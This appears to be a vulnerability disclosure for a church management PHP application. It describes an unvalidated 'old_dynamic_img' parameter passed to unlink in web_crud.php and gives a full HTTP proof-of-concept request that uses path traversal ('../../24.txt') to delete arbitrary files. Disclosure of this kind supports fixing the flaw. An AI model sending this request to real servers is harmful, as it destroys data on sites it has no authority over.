### Vulnerability file address

In line 502 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_dynamic_img']);`,` $_POST['old_dynamic_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['dynamicphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["dynamicphoto"]["name"]);

            if (move_uploaded_file($_FILES["dynamicphoto"]["tmp_name"], $filepath)) {
                $img13 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_dynamic_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 381

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_dynamic_img"

../../24.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="dynamicphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `24.txt` file in the `church/` directory

![image-20250505170942555](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051709594.png)



Then we execute the above poc to attack

![image-20250505170933031](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051709080.png)



Files are deleted after the attack is successful

![image-20250505170950229](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051709258.png)